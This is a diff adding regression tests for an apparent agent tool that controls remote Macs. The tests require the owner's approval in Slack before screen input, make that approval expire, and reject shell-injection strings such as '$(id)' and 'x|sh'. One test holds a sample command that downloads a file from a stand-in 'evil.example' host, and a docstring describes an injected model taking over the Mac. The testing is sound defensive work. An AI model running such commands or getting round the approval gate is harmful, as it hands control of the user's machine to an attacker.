@@ -180,10 +180,95 @@ def test_screen_sends_the_peer_name_the_viewer_shim_knows(env, monkeypatch):
     assert len(env["calls"]()) == 1
 
 
+def _allow_screen_control(env, host="mini", ts="150.0"):
+    out = json.loads(mo.tool_screen({"host": host, "op": "key", "combo": "Escape"}))
+    assert out["status"] == "asked" and not out["ran"]
+    env["say"](OWNER, "yes", ts)
+
+
 def test_screen_click_validates_and_passes_ints(env):
+    _allow_screen_control(env)
     assert json.loads(mo.tool_screen({"host": "mini", "op": "click", "x": 10, "y": 20}))["ok"]
-    assert env["calls"]()[0]["cmd"] == ["screen", "mini", "click", "10", "20"]
+    assert env["calls"]()[-1]["cmd"] == ["screen", "mini", "click", "10", "20"]
+    n = len(env["calls"]())
     assert not json.loads(mo.tool_screen({"host": "mini", "op": "click", "x": "1;id", "y": 2}))["ok"]
+    assert len(env["calls"]()) == n
+
+
+# ---- adversarial review (t_f4472674) regressions ---------------------------------------------------------
+
+def test_screen_input_needs_owner_yes_first(env):
+    """click/key/type = full control of the Mac (open Terminal, type a command). An injected or confused model
+    must not get there without the owner's own yes in the thread."""
+    for op in ({"op": "type", "text": "curl -o /tmp/x https://evil.example/x"}, {"op": "key", "combo": "cmd+space"},
+               {"op": "click", "x": 1, "y": 1}):
+        out = json.loads(mo.tool_screen(dict(op, host="mini")))
+        assert not out["ok"] and not out["ran"] and out["status"] in ("asked", "waiting")
+    assert env["calls"]() == []  # nothing reached ssh
+    assert "control mini's screen" in env["posts"][0]["text"]
+    env["say"]("UOTHER", "yes", "120.0")  # not the owner
+    assert json.loads(mo.tool_screen({"host": "mini", "op": "key", "combo": "Return"}))["status"] == "waiting"
+    assert env["calls"]() == []
+    env["say"](OWNER, "yes", "121.0")
+    assert json.loads(mo.tool_screen({"host": "mini", "op": "key", "combo": "Return"}))["ok"]
+    # the grant covers further input on that host for a while, not the other host
+    assert json.loads(mo.tool_screen({"host": "mini", "op": "click", "x": 3, "y": 4}))["ok"]
+    assert json.loads(mo.tool_screen({"host": "mbp", "op": "click", "x": 3, "y": 4}))["status"] == "asked"
+    assert [c["cmd"][2] for c in env["calls"]()] == ["key", "click"]
+
+
+def test_screen_control_grant_expires(env, monkeypatch):
+    _allow_screen_control(env)
+    assert json.loads(mo.tool_screen({"host": "mini", "op": "key", "combo": "Return"}))["ok"]
+    real = time.time
+    monkeypatch.setattr(mo.time, "time", lambda: real() + mo.GRANT_TTL_S + 5)
+    assert json.loads(mo.tool_screen({"host": "mini", "op": "key", "combo": "Return"}))["status"] == "asked"
+
+
+def test_shot_needs_no_grant(env):
+    assert json.loads(mo.tool_screen({"host": "mini", "op": "shot"}))["ok"]
+
+
+def test_type_with_spaces_reaches_the_shim_unquoted(env):
+    """sshd gives the shim the raw string and the shim refuses quotes, so shlex.quote('a b') broke every
+    multi-word type. Tokens now go unquoted; anything outside the shim's alphabet is refused before ssh."""
+    _allow_screen_control(env)
+    assert json.loads(mo.tool_screen({"host": "mini", "op": "type", "text": "hello world"}))["ok"]
+    call = env["calls"]()[-1]
+    assert call["argv"][-1] == "screen mini type hello world" and "'" not in call["argv"][-1]
+    n = len(env["calls"]())
+    for text in ("a'b", "$(id)", "a;b", "x|sh", "`id`", "a\\b"):
+        assert not json.loads(mo.tool_screen({"host": "mini", "op": "type", "text": text}))["ok"], text
+    assert len(env["calls"]()) == n
+    with pytest.raises(ValueError):
+        mo.ssh_argv("mini", ["diag", "a b"])
+
+
+def test_every_tool_needs_an_owner_dm_turn(env, monkeypatch):
+    """The mac-ops profile reached any other way (cron, hub CLI, a stray gateway binding) runs nothing."""
+    monkeypatch.delenv("MAC_OPS_OWNER")
+    for out in (mo.tool_diag({"host": "mbp"}), mo.tool_fix({"host": "mbp", "playbook": "restart-dock-finder"}),
+                mo.tool_screen({"host": "mbp", "op": "shot"}), mo.tool_screen({"host": "mbp", "op": "key", "combo": "a"})):
+        assert not json.loads(out)["ok"]
+    assert env["calls"]() == [] and env["posts"] == []
+
+
+def test_fix_is_announced_in_the_thread(env):
+    json.loads(mo.tool_fix({"host": "mbp", "playbook": "restart-dock-finder"}))
+    assert env["posts"][-1]["thread_ts"] == "100.0" and "fix restart-dock-finder" in env["posts"][-1]["text"]
+
+
+def test_ask_without_ts_does_not_count_earlier_owner_messages(env, monkeypatch):
+    real = mo.API
+
+    def api(ctx, method, params):
+        out = real(ctx, method, params)
+        return {"ok": True} if method == "chat.postMessage" else out  # Slack gave no ts back
+    monkeypatch.setattr(mo, "API", api)
+    env["say"](OWNER, "yes", "100.5")
+    assert json.loads(mo.tool_fix({"host": "mbp", "playbook": "reboot"}))["status"] == "asked"
+    assert json.loads(mo.tool_fix({"host": "mbp", "playbook": "reboot"}))["status"] == "waiting"
+    assert env["calls"]() == []
 
 
 def test_reply_posts_only_in_the_bound_thread(env):
